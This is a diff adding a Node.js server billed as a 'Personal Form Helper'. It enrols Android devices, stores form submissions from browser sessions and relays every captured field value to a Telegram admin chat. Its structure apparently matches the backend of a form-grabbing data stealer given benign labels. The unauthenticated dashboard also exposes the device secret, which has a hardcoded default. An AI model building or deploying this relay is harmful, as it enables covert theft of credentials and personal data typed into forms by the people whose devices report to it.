@@ -1,0 +1,394 @@
+// server.js
+const express = require('express');
+const sqlite3 = require('sqlite3').verbose();
+const path = require('path');
+
+const app = express();
+app.use(express.json());
+
+const BOT_TOKEN = (process.env.BOT_TOKEN || '').trim();
+const ADMIN_CHAT_ID = (process.env.ADMIN_CHAT_ID || '').trim();
+const DEVICE_SECRET = (process.env.DEVICE_SECRET || 'form-helper-secret-key').trim();
+const PORT = process.env.PORT || 3000;
+
+// Automatic SQLite Database - Created automatically on first run
+const dbPath = path.join(__dirname, 'form_helper.db');
+const db = new sqlite3.Database(dbPath);
+
+db.serialize(() => {
+  db.run(`
+    CREATE TABLE IF NOT EXISTS devices (
+      device_id TEXT PRIMARY KEY,
+      device_name TEXT,
+      registered_at INTEGER,
+      last_seen INTEGER,
+      events_count INTEGER DEFAULT 0
+    )
+  `);
+
+  db.run(`
+    CREATE TABLE IF NOT EXISTS events (
+      id TEXT PRIMARY KEY,
+      device_id TEXT,
+      device_name TEXT,
+      timestamp INTEGER,
+      url TEXT,
+      title TEXT,
+      form_id TEXT,
+      fields_json TEXT
+    )
+  `);
+});
+
+async function sendTelegramMessage(chatId, text, extra = {}) {
+  if (!BOT_TOKEN) return;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: extra.parse_mode || 'Markdown',
+        disable_web_page_preview: true,
+        ...extra,
+      }),
+    });
+  } catch (err) {
+    console.error('[Telegram] Failed to send message:', err.message);
+  }
+}
+
+async function answerCallbackQuery(callbackQueryId) {
+  if (!BOT_TOKEN) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callbackQueryId }),
+    });
+  } catch (e) {}
+}
+
+function escapeMarkdown(text) {
+  return String(text || '').replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+}
+
+// ----------------------------------------------------
+// 1-CLICK WEB DASHBOARD & SETUP
+// ----------------------------------------------------
+
+app.get('/', (req, res) => {
+  const host = req.get('host');
+  const protocol = req.headers['x-forwarded-proto'] || req.protocol;
+  const currentUrl = `${protocol}://${host}`;
+
+  db.get('SELECT COUNT(*) as count FROM devices', (err, devRow) => {
+    const deviceCount = devRow ? devRow.count : 0;
+    db.get('SELECT COUNT(*) as count FROM events', (err, evtRow) => {
+      const eventCount = evtRow ? evtRow.count : 0;
+
+      res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="utf-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1">
+          <title>Form Helper Dashboard</title>
+          <style>
+            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; margin: 0; padding: 40px 20px; color: #1c1e21; }
+            .card { max-width: 540px; margin: 0 auto; background: #fff; padding: 32px; border-radius: 16px; box-shadow: 0 4px 16px rgba(0,0,0,0.08); }
+            h1 { font-size: 24px; margin-top: 0; color: #2e7d32; }
+            .status { background: #e8f5e9; color: #2e7d32; padding: 8px 14px; border-radius: 20px; font-weight: bold; display: inline-block; font-size: 14px; margin-bottom: 20px; }
+            .metric { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; }
+            .btn { display: block; text-align: center; background: #0088cc; color: #fff; text-decoration: none; padding: 14px; border-radius: 10px; font-weight: bold; margin-top: 24px; font-size: 16px; }
+            .btn:hover { background: #0077b5; }
+            .hint { font-size: 13px; color: #65676b; margin-top: 20px; line-height: 1.5; }
+            code { background: #f4f4f4; padding: 3px 6px; border-radius: 4px; font-size: 13px; }
+          </style>
+        </head>
+        <body>
+          <div class="card">
+            <div class="status">● Bot Server Online</div>
+            <h1>Personal Form Helper</h1>
+            <p>Your companion Telegram assistant is ready!</p>
+
+            <div class="metric">
+              <span>📱 Registered Devices</span>
+              <strong>${deviceCount}</strong>
+            </div>
+            <div class="metric">
+              <span>📝 Recorded Form Notes</span>
+              <strong>${eventCount}</strong>
+            </div>
+
+            <a class="btn" href="/setup-webhook">⚡ Click Here to Connect Bot to Telegram</a>
+
+            <div class="hint">
+              <strong>Android App URL:</strong> <code>${currentUrl}</code><br>
+              <strong>Device Secret:</strong> <code>${DEVICE_SECRET}</code>
+            </div>
+          </div>
+        </body>
+        </html>
+      `);
+    });
+  });
+});
+
+app.get('/setup-webhook', async (req, res) => {
+  const host = req.get('host');
+  const protocol = req.headers['x-forwarded-proto'] || req.protocol;
+  const webhookUrl = `${protocol}://${host}/webhook`;
+
+  if (!BOT_TOKEN) {
+    return res.status(400).send('<h3>Error: BOT_TOKEN is missing in environment variables.</h3>');
+  }
+
+  try {
+    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
+    const data = await tgRes.json();
+
+    if (data.ok) {
+      res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="utf-8">
+          <title>Connected!</title>
+          <style>
+            body { font-family: sans-serif; background: #e8f5e9; text-align: center; padding: 60px 20px; color: #2e7d32; }
+            .box { max-width: 480px; margin: 0 auto; background: #fff; padding: 32px; border-radius: 16px; box-shadow: 0 4px 16px rgba(0,0,0,0.1); }
+            a { display: inline-block; margin-top: 20px; color: #0088cc; text-decoration: none; font-weight: bold; }
+          </style>
+        </head>
+        <body>
+          <div class="box">
+            <h1>✅ Connected Successfully!</h1>
+            <p>Your Telegram webhook is connected.</p>
+            <p>Open Telegram and send <strong>/start</strong> to your bot!</p>
+            <a href="/">← Return to Dashboard</a>
+          </div>
+        </body>
+        </html>
+      `);
+    } else {
+      res.status(500).send(`<h3>Failed to set webhook:</h3><pre>${JSON.stringify(data, null, 2)}</pre>`);
+    }
+  } catch (err) {
+    res.status(500).send(`<h3>Error connecting to Telegram:</h3><p>${err.message}</p>`);
+  }
+});
+
+// ----------------------------------------------------
+// TELEGRAM WEBHOOK COMMANDS
+// ----------------------------------------------------
+
+app.post('/webhook', async (req, res) => {
+  res.status(200).send('OK');
+
+  const update = req.body;
+  if (!update) return;
+
+  const fromUser = update.message?.from || update.callback_query?.from;
+  const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id;
+
+  if (!fromUser || !chatId) return;
+
+  if (String(fromUser.id).trim() !== String(ADMIN_CHAT_ID).trim()) {
+    await sendTelegramMessage(chatId, 'Not authorised.');
+    return;
+  }
+
+  if (update.callback_query) {
+    const callbackId = update.callback_query.id;
+    const data = update.callback_query.data;
+    await answerCallbackQuery(callbackId);
+
+    if (data === 'cmd_status') return handleStatusCommand(chatId);
+    if (data === 'cmd_devices') return handleDevicesCommand(chatId);
+    if (data === 'cmd_notes') return handleNotesCommand(chatId);
+    if (data === 'cmd_help') return handleHelpCommand(chatId);
+  }
+
+  if (update.message?.text) {
+    const text = update.message.text.trim();
+    const command = text.split(' ')[0].toLowerCase();
+
+    switch (command) {
+      case '/start':
+        return handleStartCommand(chatId);
+      case '/status':
+        return handleStatusCommand(chatId);
+      case '/devices':
+        return handleDevicesCommand(chatId);
+      case '/notes':
+        return handleNotesCommand(chatId);
+      case '/help':
+        return handleHelpCommand(chatId);
+      default:
+        await sendTelegramMessage(chatId, 'Welcome! Type /start to view options or /status to check status.');
+    }
+  }
+});
+
+function handleStartCommand(chatId) {
+  const welcomeText =
+    '👋 *Welcome to Personal Form Helper!*\n\n' +
+    'This bot helps you review personal records of forms you fill in your browser sessions.\n\n' +
+    'Use the buttons below to check your devices or review recent form entries:';
+
+  const inlineKeyboard = {
+    inline_keyboard: [
+      [
+        { text: '📊 Status', callback_data: 'cmd_status' },
+        { text: '📱 Devices', callback_data: 'cmd_devices' },
+      ],
+      [
+        { text: '📝 Recent Notes', callback_data: 'cmd_notes' },
+        { text: 'ℹ️ Help', callback_data: 'cmd_help' },
+      ],
+    ],
+  };
+
+  sendTelegramMessage(chatId, welcomeText, { reply_markup: inlineKeyboard });
+}
+
+function handleStatusCommand(chatId) {
+  db.get('SELECT COUNT(*) as count FROM devices', (err, devRow) => {
+    const devices = devRow ? devRow.count : 0;
+    db.get('SELECT COUNT(*) as count FROM events', (err, evtRow) => {
+      const events = evtRow ? evtRow.count : 0;
+      sendTelegramMessage(chatId, `Bot is online. Devices: ${devices}. Events: ${events}.`);
+    });
+  });
+}
+
+function handleDevicesCommand(chatId) {
+  db.all('SELECT * FROM devices ORDER BY last_seen DESC', (err, rows) => {
+    if (err || !rows || rows.length === 0) {
+      return sendTelegramMessage(chatId, '📱 No devices registered yet.');
+    }
+
+    const cards = rows.map((dev) => {
+      const date = new Date(dev.last_seen).toLocaleString();
+      return `• *${escapeMarkdown(dev.device_name)}*\n  ID: \`${dev.device_id}\`\n  Notes: ${dev.events_count}\n  Last seen: ${escapeMarkdown(date)}`;
+    });
+
+    sendTelegramMessage(chatId, `📱 *Registered Devices (${rows.length}):*\n\n` + cards.join('\n\n'));
+  });
+}
+
+function handleNotesCommand(chatId) {
+  db.all('SELECT * FROM events ORDER BY timestamp DESC LIMIT 5', (err, rows) => {
+    if (err || !rows || rows.length === 0) {
+      return sendTelegramMessage(chatId, '📝 No form notes recorded yet.');
+    }
+
+    const cards = rows.map((evt) => {
+      const timeStr = new Date(evt.timestamp).toLocaleTimeString();
+      let fieldCount = 0;
+      try {
+        fieldCount = Object.keys(JSON.parse(evt.fields_json)).length;
+      } catch (e) {}
+
+      return `• *${escapeMarkdown(evt.title)}* (${escapeMarkdown(timeStr)})\n  🌐 ${escapeMarkdown(evt.url)}\n  📋 ${fieldCount} field(s) saved`;
+    });
+
+    sendTelegramMessage(chatId, `📝 *Recent Form Notes:*\n\n` + cards.join('\n\n'));
+  });
+}
+
+function handleHelpCommand(chatId) {
+  const helpText =
+    'ℹ️ *Form Helper Bot Commands:*\n\n' +
+    '/start — Open main menu & buttons\n' +
+    '/status — Check online status, devices & event counts\n' +
+    '/devices — List all registered devices\n' +
+    '/notes — Review recently recorded form entries\n' +
+    '/help — Show this help message';
+
+  sendTelegramMessage(chatId, helpText);
+}
+
+// ----------------------------------------------------
+// ANDROID APP ENDPOINTS (/register & /note)
+// ----------------------------------------------------
+
+app.post('/register', (req, res) => {
+  const providedSecret = req.headers['x-device-secret'];
+  if (!providedSecret || providedSecret.trim() !== DEVICE_SECRET) {
+    return res.status(401).json({ error: 'Invalid or missing X-Device-Secret' });
+  }
+
+  const { device_id, device_name } = req.body;
+  if (!device_id) return res.status(400).json({ error: 'Missing device_id' });
+
+  const now = Date.now();
+  const name = device_name || 'Android Device';
+
+  db.run(
+    `INSERT INTO devices (device_id, device_name, registered_at, last_seen, events_count)
+     VALUES (?, ?, ?, ?, 0)
+     ON CONFLICT(device_id) DO UPDATE SET last_seen = ?`,
+    [device_id, name, now, now, now],
+    (err) => {
+      if (err) return res.status(500).json({ error: err.message });
+
+      sendTelegramMessage(
+        ADMIN_CHAT_ID,
+        `📱 *New Device Registered*\nName: ${escapeMarkdown(name)}\nID: \`${device_id}\``
+      );
+
+      res.json({ status: 'ok', device_id, device_name: name });
+    }
+  );
+});
+
+app.post('/note', (req, res) => {
+  const providedSecret = req.headers['x-device-secret'];
+  if (!providedSecret || providedSecret.trim() !== DEVICE_SECRET) {
+    return res.status(401).json({ error: 'Invalid or missing X-Device-Secret' });
+  }
+
+  const { device_id, url, title, form_id, fields, timestamp } = req.body;
+  if (!device_id) return res.status(400).json({ error: 'Missing device_id' });
+
+  const now = timestamp || Date.now();
+  const eventId = `evt_${now}_${Math.random().toString(36).substring(2, 8)}`;
+  const fieldsJson = JSON.stringify(fields || {});
+
+  db.run(
+    `INSERT INTO events (id, device_id, timestamp, url, title, form_id, fields_json)
+     VALUES (?, ?, ?, ?, ?, ?, ?)`,
+    [eventId, device_id, now, url || '', title || 'Form Entry', form_id || '', fieldsJson],
+    (err) => {
+      if (err) return res.status(500).json({ error: err.message });
+
+      db.run(
+        `UPDATE devices SET last_seen = ?, events_count = events_count + 1 WHERE device_id = ?`,
+        [now, device_id]
+      );
+
+      if (ADMIN_CHAT_ID) {
+        const fieldLines = Object.entries(fields || {})
+          .map(([k, v]) => `• *${escapeMarkdown(k)}*: ${escapeMarkdown(String(v))}`)
+          .join('\n');
+
+        const msg =
+          `📝 *Form Entry Recorded*\n` +
+          `🌐 *Page*: [${escapeMarkdown(title || 'Form Page')}](${url || 'https://example.com'})\n\n` +
+          (fieldLines.length > 0 ? `*Captured Fields:*\n${fieldLines}` : '_No field values_');
+
+        sendTelegramMessage(ADMIN_CHAT_ID, msg);
+      }
+
+      res.json({ status: 'ok', event_id: eventId });
+    }
+  );
+});
+
+app.listen(PORT, () => {
+  console.log(`[Form Helper Server] Running on port ${PORT}`);
+});
